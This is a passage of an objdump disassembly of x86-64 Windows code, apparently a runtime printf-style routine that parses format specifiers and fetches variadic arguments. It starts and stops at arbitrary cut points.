   140005acc:	66 89 45 e8          	mov    %ax,-0x18(%rbp)
   140005ad0:	0f b7 45 e8          	movzwl -0x18(%rbp),%eax
   140005ad4:	66 85 c0             	test   %ax,%ax
   140005ad7:	75 11                	jne    0x140005aea
   140005ad9:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
   140005add:	48 85 c0             	test   %rax,%rax
   140005ae0:	74 14                	je     0x140005af6
   140005ae2:	66 c7 45 e8 05 fc    	movw   $0xfc05,-0x18(%rbp)
   140005ae8:	eb 0c                	jmp    0x140005af6
   140005aea:	0f b7 45 e8          	movzwl -0x18(%rbp),%eax
   140005aee:	66 2d fc 3f          	sub    $0x3ffc,%ax
   140005af2:	66 89 45 e8          	mov    %ax,-0x18(%rbp)
   140005af6:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
   140005afa:	48 c1 e8 03          	shr    $0x3,%rax
   140005afe:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
   140005b02:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
   140005b06:	48 8b 55 e8          	mov    -0x18(%rbp),%rdx
   140005b0a:	48 89 45 c0          	mov    %rax,-0x40(%rbp)
   140005b0e:	48 89 55 c8          	mov    %rdx,-0x38(%rbp)
   140005b12:	48 8b 55 18          	mov    0x18(%rbp),%rdx
   140005b16:	48 8d 45 c0          	lea    -0x40(%rbp),%rax
   140005b1a:	48 89 c1             	mov    %rax,%rcx
   140005b1d:	e8 b4 f8 ff ff       	call   0x1400053d6
   140005b22:	90                   	nop
   140005b23:	48 83 c4 60          	add    $0x60,%rsp
   140005b27:	5d                   	pop    %rbp
   140005b28:	c3                   	ret
   140005b29:	55                   	push   %rbp
   140005b2a:	48 89 e5             	mov    %rsp,%rbp
   140005b2d:	48 81 ec d0 00 00 00 	sub    $0xd0,%rsp
   140005b34:	89 4d 10             	mov    %ecx,0x10(%rbp)
   140005b37:	48 89 55 18          	mov    %rdx,0x18(%rbp)
   140005b3b:	44 89 45 20          	mov    %r8d,0x20(%rbp)
   140005b3f:	4c 89 4d 28          	mov    %r9,0x28(%rbp)
   140005b43:	e8 20 45 00 00       	call   0x14000a068
   140005b48:	8b 00                	mov    (%rax),%eax
   140005b4a:	89 45 ec             	mov    %eax,-0x14(%rbp)
   140005b4d:	48 8b 45 18          	mov    0x18(%rbp),%rax
   140005b51:	48 89 45 a0          	mov    %rax,-0x60(%rbp)
   140005b55:	81 65 10 00 60 00 00 	andl   $0x6000,0x10(%rbp)
   140005b5c:	8b 45 10             	mov    0x10(%rbp),%eax
   140005b5f:	89 45 a8             	mov    %eax,-0x58(%rbp)
   140005b62:	c7 45 ac ff ff ff ff 	movl   $0xffffffff,-0x54(%rbp)
   140005b69:	c7 45 b0 ff ff ff ff 	movl   $0xffffffff,-0x50(%rbp)
   140005b70:	c7 45 b4 fd ff ff ff 	movl   $0xfffffffd,-0x4c(%rbp)
   140005b77:	66 c7 45 b8 00 00    	movw   $0x0,-0x48(%rbp)
   140005b7d:	c7 45 bc 00 00 00 00 	movl   $0x0,-0x44(%rbp)
   140005b84:	66 c7 45 c0 00 00    	movw   $0x0,-0x40(%rbp)
   140005b8a:	c7 45 c4 00 00 00 00 	movl   $0x0,-0x3c(%rbp)
   140005b91:	8b 45 20             	mov    0x20(%rbp),%eax
   140005b94:	89 45 c8             	mov    %eax,-0x38(%rbp)
   140005b97:	c7 45 cc ff ff ff ff 	movl   $0xffffffff,-0x34(%rbp)
   140005b9e:	e9 e7 0b 00 00       	jmp    0x14000678a
   140005ba3:	83 7d e8 25          	cmpl   $0x25,-0x18(%rbp)
   140005ba7:	0f 85 cf 0b 00 00    	jne    0x14000677c
   140005bad:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%rbp)
   140005bb4:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%rbp)
   140005bbb:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140005bbf:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
   140005bc3:	48 8d 45 a0          	lea    -0x60(%rbp),%rax
   140005bc7:	48 83 c0 0c          	add    $0xc,%rax
   140005bcb:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
   140005bcf:	8b 45 10             	mov    0x10(%rbp),%eax
   140005bd2:	89 45 a8             	mov    %eax,-0x58(%rbp)
   140005bd5:	c7 45 b0 ff ff ff ff 	movl   $0xffffffff,-0x50(%rbp)
   140005bdc:	8b 45 b0             	mov    -0x50(%rbp),%eax
   140005bdf:	89 45 ac             	mov    %eax,-0x54(%rbp)
   140005be2:	e9 84 0b 00 00       	jmp    0x14000676b
   140005be7:	48 8b 45 28          	mov    0x28(%rbp),%rax
   140005beb:	48 8d 50 01          	lea    0x1(%rax),%rdx
   140005bef:	48 89 55 28          	mov    %rdx,0x28(%rbp)
   140005bf3:	0f b6 00             	movzbl (%rax),%eax
   140005bf6:	0f be c0             	movsbl %al,%eax
   140005bf9:	89 45 e8             	mov    %eax,-0x18(%rbp)
   140005bfc:	83 7d e8 7a          	cmpl   $0x7a,-0x18(%rbp)
   140005c00:	0f 84 45 09 00 00    	je     0x14000654b
   140005c06:	83 7d e8 7a          	cmpl   $0x7a,-0x18(%rbp)
   140005c0a:	0f 8f c2 0a 00 00    	jg     0x1400066d2
   140005c10:	83 7d e8 78          	cmpl   $0x78,-0x18(%rbp)
   140005c14:	0f 84 af 03 00 00    	je     0x140005fc9
   140005c1a:	83 7d e8 78          	cmpl   $0x78,-0x18(%rbp)
   140005c1e:	0f 8f ae 0a 00 00    	jg     0x1400066d2
   140005c24:	83 7d e8 75          	cmpl   $0x75,-0x18(%rbp)
   140005c28:	0f 84 9b 03 00 00    	je     0x140005fc9
   140005c2e:	83 7d e8 75          	cmpl   $0x75,-0x18(%rbp)
   140005c32:	0f 8f 9a 0a 00 00    	jg     0x1400066d2
   140005c38:	83 7d e8 74          	cmpl   $0x74,-0x18(%rbp)
   140005c3c:	0f 84 f6 08 00 00    	je     0x140006538
   140005c42:	83 7d e8 74          	cmpl   $0x74,-0x18(%rbp)
   140005c46:	0f 8f 86 0a 00 00    	jg     0x1400066d2
   140005c4c:	83 7d e8 73          	cmpl   $0x73,-0x18(%rbp)
   140005c50:	0f 84 09 03 00 00    	je     0x140005f5f
   140005c56:	83 7d e8 73          	cmpl   $0x73,-0x18(%rbp)
   140005c5a:	0f 8f 72 0a 00 00    	jg     0x1400066d2
   140005c60:	83 7d e8 70          	cmpl   $0x70,-0x18(%rbp)
   140005c64:	0f 84 00 05 00 00    	je     0x14000616a
   140005c6a:	83 7d e8 70          	cmpl   $0x70,-0x18(%rbp)
   140005c6e:	0f 8f 5e 0a 00 00    	jg     0x1400066d2
   140005c74:	83 7d e8 6f          	cmpl   $0x6f,-0x18(%rbp)
   140005c78:	0f 84 4b 03 00 00    	je     0x140005fc9
   140005c7e:	83 7d e8 6f          	cmpl   $0x6f,-0x18(%rbp)
   140005c82:	0f 8f 4a 0a 00 00    	jg     0x1400066d2
   140005c88:	83 7d e8 6e          	cmpl   $0x6e,-0x18(%rbp)
   140005c8c:	0f 84 25 07 00 00    	je     0x1400063b7
   140005c92:	83 7d e8 6e          	cmpl   $0x6e,-0x18(%rbp)
   140005c96:	0f 8f 36 0a 00 00    	jg     0x1400066d2
   140005c9c:	83 7d e8 6d          	cmpl   $0x6d,-0x18(%rbp)
   140005ca0:	0f 84 05 03 00 00    	je     0x140005fab
   140005ca6:	83 7d e8 6d          	cmpl   $0x6d,-0x18(%rbp)
   140005caa:	0f 8f 22 0a 00 00    	jg     0x1400066d2
   140005cb0:	83 7d e8 6c          	cmpl   $0x6c,-0x18(%rbp)
   140005cb4:	0f 84 3d 08 00 00    	je     0x1400064f7
   140005cba:	83 7d e8 6c          	cmpl   $0x6c,-0x18(%rbp)
   140005cbe:	0f 8f 0e 0a 00 00    	jg     0x1400066d2
   140005cc4:	83 7d e8 6a          	cmpl   $0x6a,-0x18(%rbp)
   140005cc8:	0f 84 b3 07 00 00    	je     0x140006481
   140005cce:	83 7d e8 6a          	cmpl   $0x6a,-0x18(%rbp)
   140005cd2:	0f 8f fa 09 00 00    	jg     0x1400066d2
   140005cd8:	83 7d e8 69          	cmpl   $0x69,-0x18(%rbp)
   140005cdc:	0f 84 c6 03 00 00    	je     0x1400060a8
   140005ce2:	83 7d e8 69          	cmpl   $0x69,-0x18(%rbp)
   140005ce6:	0f 8f e6 09 00 00    	jg     0x1400066d2
   140005cec:	83 7d e8 68          	cmpl   $0x68,-0x18(%rbp)
   140005cf0:	0f 84 5f 07 00 00    	je     0x140006455
   140005cf6:	83 7d e8 68          	cmpl   $0x68,-0x18(%rbp)
   140005cfa:	0f 8f d2 09 00 00    	jg     0x1400066d2
   140005d00:	83 7d e8 67          	cmpl   $0x67,-0x18(%rbp)
   140005d04:	0f 84 cb 05 00 00    	je     0x1400062d5
   140005d0a:	83 7d e8 67          	cmpl   $0x67,-0x18(%rbp)
   140005d0e:	0f 8f be 09 00 00    	jg     0x1400066d2
   140005d14:	83 7d e8 66          	cmpl   $0x66,-0x18(%rbp)
   140005d18:	0f 84 39 05 00 00    	je     0x140006257
   140005d1e:	83 7d e8 66          	cmpl   $0x66,-0x18(%rbp)
   140005d22:	0f 8f aa 09 00 00    	jg     0x1400066d2
   140005d28:	83 7d e8 65          	cmpl   $0x65,-0x18(%rbp)
   140005d2c:	0f 84 a7 04 00 00    	je     0x1400061d9
   140005d32:	83 7d e8 65          	cmpl   $0x65,-0x18(%rbp)
   140005d36:	0f 8f 96 09 00 00    	jg     0x1400066d2
   140005d3c:	83 7d e8 64          	cmpl   $0x64,-0x18(%rbp)
   140005d40:	0f 84 62 03 00 00    	je     0x1400060a8
   140005d46:	83 7d e8 64          	cmpl   $0x64,-0x18(%rbp)
   140005d4a:	0f 8f 82 09 00 00    	jg     0x1400066d2
   140005d50:	83 7d e8 63          	cmpl   $0x63,-0x18(%rbp)
   140005d54:	0f 84 8d 01 00 00    	je     0x140005ee7
   140005d5a:	83 7d e8 63          	cmpl   $0x63,-0x18(%rbp)
   140005d5e:	0f 8f 6e 09 00 00    	jg     0x1400066d2
   140005d64:	83 7d e8 61          	cmpl   $0x61,-0x18(%rbp)
   140005d68:	0f 84 e5 05 00 00    	je     0x140006353
   140005d6e:	83 7d e8 61          	cmpl   $0x61,-0x18(%rbp)
   140005d72:	0f 8f 5a 09 00 00    	jg     0x1400066d2
   140005d78:	83 7d e8 58          	cmpl   $0x58,-0x18(%rbp)
   140005d7c:	0f 84 47 02 00 00    	je     0x140005fc9
   140005d82:	83 7d e8 58          	cmpl   $0x58,-0x18(%rbp)
   140005d86:	0f 8f 46 09 00 00    	jg     0x1400066d2
   140005d8c:	83 7d e8 53          	cmpl   $0x53,-0x18(%rbp)
   140005d90:	0f 84 c2 01 00 00    	je     0x140005f58
   140005d96:	83 7d e8 53          	cmpl   $0x53,-0x18(%rbp)
   140005d9a:	0f 8f 32 09 00 00    	jg     0x1400066d2
   140005da0:	83 7d e8 4c          	cmpl   $0x4c,-0x18(%rbp)
   140005da4:	0f 84 79 07 00 00    	je     0x140006523
   140005daa:	83 7d e8 4c          	cmpl   $0x4c,-0x18(%rbp)
   140005dae:	0f 8f 1e 09 00 00    	jg     0x1400066d2
   140005db4:	83 7d e8 49          	cmpl   $0x49,-0x18(%rbp)
   140005db8:	0f 84 d6 06 00 00    	je     0x140006494
   140005dbe:	83 7d e8 49          	cmpl   $0x49,-0x18(%rbp)
   140005dc2:	0f 8f 0a 09 00 00    	jg     0x1400066d2
   140005dc8:	83 7d e8 47          	cmpl   $0x47,-0x18(%rbp)
   140005dcc:	0f 84 0c 05 00 00    	je     0x1400062de
   140005dd2:	83 7d e8 47          	cmpl   $0x47,-0x18(%rbp)
   140005dd6:	0f 8f f6 08 00 00    	jg     0x1400066d2
   140005ddc:	83 7d e8 46          	cmpl   $0x46,-0x18(%rbp)
   140005de0:	0f 84 7a 04 00 00    	je     0x140006260
   140005de6:	83 7d e8 46          	cmpl   $0x46,-0x18(%rbp)
   140005dea:	0f 8f e2 08 00 00    	jg     0x1400066d2
   140005df0:	83 7d e8 45          	cmpl   $0x45,-0x18(%rbp)
   140005df4:	0f 84 e8 03 00 00    	je     0x1400061e2
   140005dfa:	83 7d e8 45          	cmpl   $0x45,-0x18(%rbp)
   140005dfe:	0f 8f ce 08 00 00    	jg     0x1400066d2
   140005e04:	83 7d e8 43          	cmpl   $0x43,-0x18(%rbp)
   140005e08:	0f 84 d2 00 00 00    	je     0x140005ee0
   140005e0e:	83 7d e8 43          	cmpl   $0x43,-0x18(%rbp)
   140005e12:	0f 8f ba 08 00 00    	jg     0x1400066d2
   140005e18:	83 7d e8 41          	cmpl   $0x41,-0x18(%rbp)
   140005e1c:	0f 84 3a 05 00 00    	je     0x14000635c
   140005e22:	83 7d e8 41          	cmpl   $0x41,-0x18(%rbp)
   140005e26:	0f 8f a6 08 00 00    	jg     0x1400066d2
   140005e2c:	83 7d e8 30          	cmpl   $0x30,-0x18(%rbp)
   140005e30:	0f 84 88 08 00 00    	je     0x1400066be
   140005e36:	83 7d e8 30          	cmpl   $0x30,-0x18(%rbp)
   140005e3a:	0f 8f 92 08 00 00    	jg     0x1400066d2
   140005e40:	83 7d e8 2e          	cmpl   $0x2e,-0x18(%rbp)
   140005e44:	0f 84 14 07 00 00    	je     0x14000655e
   140005e4a:	83 7d e8 2e          	cmpl   $0x2e,-0x18(%rbp)
   140005e4e:	0f 8f 7e 08 00 00    	jg     0x1400066d2
   140005e54:	83 7d e8 2d          	cmpl   $0x2d,-0x18(%rbp)
   140005e58:	0f 84 c8 07 00 00    	je     0x140006626
   140005e5e:	83 7d e8 2d          	cmpl   $0x2d,-0x18(%rbp)
   140005e62:	0f 8f 6a 08 00 00    	jg     0x1400066d2
   140005e68:	83 7d e8 2b          	cmpl   $0x2b,-0x18(%rbp)
   140005e6c:	0f 84 9c 07 00 00    	je     0x14000660e
   140005e72:	83 7d e8 2b          	cmpl   $0x2b,-0x18(%rbp)
   140005e76:	0f 8f 56 08 00 00    	jg     0x1400066d2
   140005e7c:	83 7d e8 2a          	cmpl   $0x2a,-0x18(%rbp)
   140005e80:	0f 84 09 07 00 00    	je     0x14000658f
   140005e86:	83 7d e8 2a          	cmpl   $0x2a,-0x18(%rbp)
   140005e8a:	0f 8f 42 08 00 00    	jg     0x1400066d2
   140005e90:	83 7d e8 27          	cmpl   $0x27,-0x18(%rbp)
   140005e94:	0f 84 a4 07 00 00    	je     0x14000663e
   140005e9a:	83 7d e8 27          	cmpl   $0x27,-0x18(%rbp)
   140005e9e:	0f 8f 2e 08 00 00    	jg     0x1400066d2
   140005ea4:	83 7d e8 25          	cmpl   $0x25,-0x18(%rbp)
   140005ea8:	74 23                	je     0x140005ecd
   140005eaa:	83 7d e8 25          	cmpl   $0x25,-0x18(%rbp)
   140005eae:	0f 8f 1e 08 00 00    	jg     0x1400066d2
   140005eb4:	83 7d e8 20          	cmpl   $0x20,-0x18(%rbp)
   140005eb8:	0f 84 e8 07 00 00    	je     0x1400066a6
   140005ebe:	83 7d e8 23          	cmpl   $0x23,-0x18(%rbp)
   140005ec2:	0f 84 2e 07 00 00    	je     0x1400065f6
   140005ec8:	e9 05 08 00 00       	jmp    0x1400066d2
   140005ecd:	48 8d 55 a0          	lea    -0x60(%rbp),%rdx
   140005ed1:	8b 45 e8             	mov    -0x18(%rbp),%eax
   140005ed4:	89 c1                	mov    %eax,%ecx
   140005ed6:	e8 b5 dc ff ff       	call   0x140003b90
   140005edb:	e9 be fc ff ff       	jmp    0x140005b9e
   140005ee0:	c7 45 f8 02 00 00 00 	movl   $0x2,-0x8(%rbp)
   140005ee7:	c7 45 b0 ff ff ff ff 	movl   $0xffffffff,-0x50(%rbp)
   140005eee:	83 7d f8 02          	cmpl   $0x2,-0x8(%rbp)
   140005ef2:	74 06                	je     0x140005efa
   140005ef4:	83 7d f8 03          	cmpl   $0x3,-0x8(%rbp)
   140005ef8:	75 30                	jne    0x140005f2a
   140005efa:	48 8b 45 30          	mov    0x30(%rbp),%rax
   140005efe:	48 8d 50 08          	lea    0x8(%rax),%rdx
   140005f02:	48 89 55 30          	mov    %rdx,0x30(%rbp)
   140005f06:	8b 00                	mov    (%rax),%eax
   140005f08:	66 89 45 8e          	mov    %ax,-0x72(%rbp)
   140005f0c:	48 8d 55 a0          	lea    -0x60(%rbp),%rdx
   140005f10:	48 8d 45 8e          	lea    -0x72(%rbp),%rax
   140005f14:	49 89 d0             	mov    %rdx,%r8
   140005f17:	ba 01 00 00 00       	mov    $0x1,%edx
   140005f1c:	48 89 c1             	mov    %rax,%rcx
   140005f1f:	e8 75 de ff ff       	call   0x140003d99
   140005f24:	90                   	nop
   140005f25:	e9 74 fc ff ff       	jmp    0x140005b9e
   140005f2a:	48 8b 45 30          	mov    0x30(%rbp),%rax
   140005f2e:	48 8d 50 08          	lea    0x8(%rax),%rdx
   140005f32:	48 89 55 30          	mov    %rdx,0x30(%rbp)
   140005f36:	8b 00                	mov    (%rax),%eax
   140005f38:	88 45 90             	mov    %al,-0x70(%rbp)
   140005f3b:	48 8d 55 a0          	lea    -0x60(%rbp),%rdx
   140005f3f:	48 8d 45 90          	lea    -0x70(%rbp),%rax
   140005f43:	49 89 d0             	mov    %rdx,%r8
   140005f46:	ba 01 00 00 00       	mov    $0x1,%edx
   140005f4b:	48 89 c1             	mov    %rax,%rcx
   140005f4e:	e8 c1 dc ff ff       	call   0x140003c14
   140005f53:	e9 46 fc ff ff       	jmp    0x140005b9e
   140005f58:	c7 45 f8 02 00 00 00 	movl   $0x2,-0x8(%rbp)
   140005f5f:	83 7d f8 02          	cmpl   $0x2,-0x8(%rbp)
   140005f63:	74 06                	je     0x140005f6b
   140005f65:	83 7d f8 03          	cmpl   $0x3,-0x8(%rbp)
   140005f69:	75 20                	jne    0x140005f8b
   140005f6b:	48 8b 45 30          	mov    0x30(%rbp),%rax
   140005f6f:	48 8d 50 08          	lea    0x8(%rax),%rdx
   140005f73:	48 89 55 30          	mov    %rdx,0x30(%rbp)
   140005f77:	48 8b 00             	mov    (%rax),%rax
   140005f7a:	48 8d 55 a0          	lea    -0x60(%rbp),%rdx
   140005f7e:	48 89 c1             	mov    %rax,%rcx
   140005f81:	e8 72 df ff ff       	call   0x140003ef8
   140005f86:	e9 13 fc ff ff       	jmp    0x140005b9e
   140005f8b:	48 8b 45 30          	mov    0x30(%rbp),%rax
   140005f8f:	48 8d 50 08          	lea    0x8(%rax),%rdx
   140005f93:	48 89 55 30          	mov    %rdx,0x30(%rbp)
   140005f97:	48 8b 00             	mov    (%rax),%rax
   140005f9a:	48 8d 55 a0          	lea    -0x60(%rbp),%rdx
   140005f9e:	48 89 c1             	mov    %rax,%rcx
   140005fa1:	e8 6d dd ff ff       	call   0x140003d13
   140005fa6:	e9 f3 fb ff ff       	jmp    0x140005b9e
   140005fab:	8b 45 ec             	mov    -0x14(%rbp),%eax
   140005fae:	89 c1                	mov    %eax,%ecx
   140005fb0:	e8 6b 41 00 00       	call   0x14000a120
   140005fb5:	48 89 c1             	mov    %rax,%rcx
   140005fb8:	48 8d 45 a0          	lea    -0x60(%rbp),%rax
   140005fbc:	48 89 c2             	mov    %rax,%rdx
   140005fbf:	e8 4f dd ff ff       	call   0x140003d13
   140005fc4:	e9 d5 fb ff ff       	jmp    0x140005b9e
   140005fc9:	8b 45 a8             	mov    -0x58(%rbp),%eax
   140005fcc:	80 e4 fe             	and    $0xfe,%ah
   140005fcf:	89 45 a8             	mov    %eax,-0x58(%rbp)
   140005fd2:	83 7d f8 03          	cmpl   $0x3,-0x8(%rbp)
   140005fd6:	75 15                	jne    0x140005fed
   140005fd8:	48 8b 45 30          	mov    0x30(%rbp),%rax
   140005fdc:	48 8d 50 08          	lea    0x8(%rax),%rdx
   140005fe0:	48 89 55 30          	mov    %rdx,0x30(%rbp)
   140005fe4:	48 8b 00             	mov    (%rax),%rax
   140005fe7:	48 89 45 90          	mov    %rax,-0x70(%rbp)
   140005feb:	eb 54                	jmp    0x140006041
   140005fed:	83 7d f8 02          	cmpl   $0x2,-0x8(%rbp)
   140005ff1:	75 16                	jne    0x140006009
   140005ff3:	48 8b 45 30          	mov    0x30(%rbp),%rax
   140005ff7:	48 8d 50 08          	lea    0x8(%rax),%rdx
   140005ffb:	48 89 55 30          	mov    %rdx,0x30(%rbp)
   140005fff:	8b 00                	mov    (%rax),%eax
   140006001:	89 c0                	mov    %eax,%eax
   140006003:	48 89 45 90          	mov    %rax,-0x70(%rbp)
   140006007:	eb 38                	jmp    0x140006041
   140006009:	48 8b 45 30          	mov    0x30(%rbp),%rax
   14000600d:	48 8d 50 08          	lea    0x8(%rax),%rdx
   140006011:	48 89 55 30          	mov    %rdx,0x30(%rbp)
   140006015:	8b 00                	mov    (%rax),%eax
   140006017:	89 c0                	mov    %eax,%eax
   140006019:	48 89 45 90          	mov    %rax,-0x70(%rbp)
   14000601d:	83 7d f8 01          	cmpl   $0x1,-0x8(%rbp)
   140006021:	75 0d                	jne    0x140006030
   140006023:	0f b7 45 90          	movzwl -0x70(%rbp),%eax
   140006027:	0f b7 c0             	movzwl %ax,%eax
   14000602a:	48 89 45 90          	mov    %rax,-0x70(%rbp)
   14000602e:	eb 11                	jmp    0x140006041
   140006030:	83 7d f8 05          	cmpl   $0x5,-0x8(%rbp)
   140006034:	75 0b                	jne    0x140006041
   140006036:	0f b6 45 90          	movzbl -0x70(%rbp),%eax
   14000603a:	0f b6 c0             	movzbl %al,%eax
   14000603d:	48 89 45 90          	mov    %rax,-0x70(%rbp)
   140006041:	83 7d e8 75          	cmpl   $0x75,-0x18(%rbp)
   140006045:	75 2e                	jne    0x140006075
   140006047:	48 8b 45 90          	mov    -0x70(%rbp),%rax
   14000604b:	48 8b 55 98          	mov    -0x68(%rbp),%rdx
   14000604f:	48 89 85 70 ff ff ff 	mov    %rax,-0x90(%rbp)
   140006056:	48 89 95 78 ff ff ff 	mov    %rdx,-0x88(%rbp)
   14000605d:	48 8d 55 a0          	lea    -0x60(%rbp),%rdx
   140006061:	48 8d 85 70 ff ff ff 	lea    -0x90(%rbp),%rax
   140006068:	48 89 c1             	mov    %rax,%rcx
   14000606b:	e8 9e df ff ff       	call   0x14000400e
   140006070:	e9 29 fb ff ff       	jmp    0x140005b9e
   140006075:	48 8b 45 90          	mov    -0x70(%rbp),%rax
   140006079:	48 8b 55 98          	mov    -0x68(%rbp),%rdx
   14000607d:	48 89 85 70 ff ff ff 	mov    %rax,-0x90(%rbp)
   140006084:	48 89 95 78 ff ff ff 	mov    %rdx,-0x88(%rbp)
   14000608b:	48 8d 4d a0          	lea    -0x60(%rbp),%rcx
   14000608f:	48 8d 95 70 ff ff ff 	lea    -0x90(%rbp),%rdx
   140006096:	8b 45 e8             	mov    -0x18(%rbp),%eax
   140006099:	49 89 c8             	mov    %rcx,%r8
   14000609c:	89 c1                	mov    %eax,%ecx
   14000609e:	e8 ee e2 ff ff       	call   0x140004391
   1400060a3:	e9 f6 fa ff ff       	jmp    0x140005b9e
   1400060a8:	8b 45 a8             	mov    -0x58(%rbp),%eax
   1400060ab:	0c 80                	or     $0x80,%al
   1400060ad:	89 45 a8             	mov    %eax,-0x58(%rbp)
   1400060b0:	83 7d f8 03          	cmpl   $0x3,-0x8(%rbp)
   1400060b4:	75 15                	jne    0x1400060cb
   1400060b6:	48 8b 45 30          	mov    0x30(%rbp),%rax
   1400060ba:	48 8d 50 08          	lea    0x8(%rax),%rdx
   1400060be:	48 89 55 30          	mov    %rdx,0x30(%rbp)
   1400060c2:	48 8b 00             	mov    (%rax),%rax
   1400060c5:	48 89 45 90          	mov    %rax,-0x70(%rbp)
   1400060c9:	eb 56                	jmp    0x140006121
   1400060cb:	83 7d f8 02          	cmpl   $0x2,-0x8(%rbp)
   1400060cf:	75 16                	jne    0x1400060e7
   1400060d1:	48 8b 45 30          	mov    0x30(%rbp),%rax
   1400060d5:	48 8d 50 08          	lea    0x8(%rax),%rdx
   1400060d9:	48 89 55 30          	mov    %rdx,0x30(%rbp)
   1400060dd:	8b 00                	mov    (%rax),%eax
   1400060df:	48 98                	cltq
   1400060e1:	48 89 45 90          	mov    %rax,-0x70(%rbp)
   1400060e5:	eb 3a                	jmp    0x140006121
   1400060e7:	48 8b 45 30          	mov    0x30(%rbp),%rax
   1400060eb:	48 8d 50 08          	lea    0x8(%rax),%rdx
   1400060ef:	48 89 55 30          	mov    %rdx,0x30(%rbp)
   1400060f3:	8b 00                	mov    (%rax),%eax
   1400060f5:	48 98                	cltq
   1400060f7:	48 89 45 90          	mov    %rax,-0x70(%rbp)
   1400060fb:	83 7d f8 01          	cmpl   $0x1,-0x8(%rbp)
   1400060ff:	75 0e                	jne    0x14000610f
   140006101:	0f b7 45 90          	movzwl -0x70(%rbp),%eax
   140006105:	48 0f bf c0          	movswq %ax,%rax
   140006109:	48 89 45 90          	mov    %rax,-0x70(%rbp)
   14000610d:	eb 12                	jmp    0x140006121
   14000610f:	83 7d f8 05          	cmpl   $0x5,-0x8(%rbp)
   140006113:	75 0c                	jne    0x140006121
   140006115:	0f b6 45 90          	movzbl -0x70(%rbp),%eax
   140006119:	48 0f be c0          	movsbq %al,%rax
   14000611d:	48 89 45 90          	mov    %rax,-0x70(%rbp)
   140006121:	48 8b 45 90          	mov    -0x70(%rbp),%rax
   140006125:	48 85 c0             	test   %rax,%rax
   140006128:	79 09                	jns    0x140006133
   14000612a:	48 c7 c0 ff ff ff ff 	mov    $0xffffffffffffffff,%rax
   140006131:	eb 05                	jmp    0x140006138
   140006133:	b8 00 00 00 00       	mov    $0x0,%eax
   140006138:	48 89 45 98          	mov    %rax,-0x68(%rbp)
   14000613c:	48 8b 45 90          	mov    -0x70(%rbp),%rax
   140006140:	48 8b 55 98          	mov    -0x68(%rbp),%rdx
   140006144:	48 89 85 70 ff ff ff 	mov    %rax,-0x90(%rbp)
   14000614b:	48 89 95 78 ff ff ff 	mov    %rdx,-0x88(%rbp)
   140006152:	48 8d 55 a0          	lea    -0x60(%rbp),%rdx
   140006156:	48 8d 85 70 ff ff ff 	lea    -0x90(%rbp),%rax
   14000615d:	48 89 c1             	mov    %rax,%rcx
   140006160:	e8 a9 de ff ff       	call   0x14000400e
   140006165:	e9 34 fa ff ff       	jmp    0x140005b9e
   14000616a:	83 7d fc 00          	cmpl   $0x0,-0x4(%rbp)
   14000616e:	75 18                	jne    0x140006188
   140006170:	8b 45 a8             	mov    -0x58(%rbp),%eax
   140006173:	39 45 10             	cmp    %eax,0x10(%rbp)
   140006176:	75 10                	jne    0x140006188
   140006178:	8b 45 a8             	mov    -0x58(%rbp),%eax
   14000617b:	80 cc 02             	or     $0x2,%ah
   14000617e:	89 45 a8             	mov    %eax,-0x58(%rbp)
   140006181:	c7 45 b0 10 00 00 00 	movl   $0x10,-0x50(%rbp)
   140006188:	48 8b 45 30          	mov    0x30(%rbp),%rax
   14000618c:	48 8d 50 08          	lea    0x8(%rax),%rdx
   140006190:	48 89 55 30          	mov    %rdx,0x30(%rbp)
   140006194:	48 8b 00             	mov    (%rax),%rax
   140006197:	48 89 45 90          	mov    %rax,-0x70(%rbp)
   14000619b:	48 c7 45 98 00 00 00 	movq   $0x0,-0x68(%rbp)
   1400061a2:	00 
   1400061a3:	48 8b 45 90          	mov    -0x70(%rbp),%rax
   1400061a7:	48 8b 55 98          	mov    -0x68(%rbp),%rdx
   1400061ab:	48 89 85 70 ff ff ff 	mov    %rax,-0x90(%rbp)
   1400061b2:	48 89 95 78 ff ff ff 	mov    %rdx,-0x88(%rbp)
   1400061b9:	48 8d 55 a0          	lea    -0x60(%rbp),%rdx
   1400061bd:	48 8d 85 70 ff ff ff 	lea    -0x90(%rbp),%rax
   1400061c4:	49 89 d0             	mov    %rdx,%r8
   1400061c7:	48 89 c2             	mov    %rax,%rdx
   1400061ca:	b9 78 00 00 00       	mov    $0x78,%ecx
   1400061cf:	e8 bd e1 ff ff       	call   0x140004391
   1400061d4:	e9 c5 f9 ff ff       	jmp    0x140005b9e
   1400061d9:	8b 45 a8             	mov    -0x58(%rbp),%eax
   1400061dc:	83 c8 20             	or     $0x20,%eax
   1400061df:	89 45 a8             	mov    %eax,-0x58(%rbp)
   1400061e2:	8b 45 a8             	mov    -0x58(%rbp),%eax
   1400061e5:	83 e0 04             	and    $0x4,%eax
   1400061e8:	85 c0                	test   %eax,%eax
   1400061ea:	74 2f                	je     0x14000621b
   1400061ec:	48 8b 45 30          	mov    0x30(%rbp),%rax
   1400061f0:	48 8d 50 08          	lea    0x8(%rax),%rdx
   1400061f4:	48 89 55 30          	mov    %rdx,0x30(%rbp)
   1400061f8:	48 8b 00             	mov    (%rax),%rax
   1400061fb:	db 28                	fldt   (%rax)
   1400061fd:	db bd 60 ff ff ff    	fstpt  -0xa0(%rbp)
   140006203:	48 8d 55 a0          	lea    -0x60(%rbp),%rdx
   140006207:	48 8d 85 60 ff ff ff 	lea    -0xa0(%rbp),%rax
   14000620e:	48 89 c1             	mov    %rax,%rcx
   140006211:	e8 42 ef ff ff       	call   0x140005158
   140006216:	e9 83 f9 ff ff       	jmp    0x140005b9e
   14000621b:	48 8b 45 30          	mov    0x30(%rbp),%rax
   14000621f:	48 8d 50 08          	lea    0x8(%rax),%rdx
   140006223:	48 89 55 30          	mov    %rdx,0x30(%rbp)
   140006227:	f2 0f 10 08          	movsd  (%rax),%xmm1
   14000622b:	f2 0f 11 8d 58 ff ff 	movsd  %xmm1,-0xa8(%rbp)
   140006232:	ff 
   140006233:	dd 85 58 ff ff ff    	fldl   -0xa8(%rbp)
   140006239:	db bd 60 ff ff ff    	fstpt  -0xa0(%rbp)
   14000623f:	48 8d 55 a0          	lea    -0x60(%rbp),%rdx
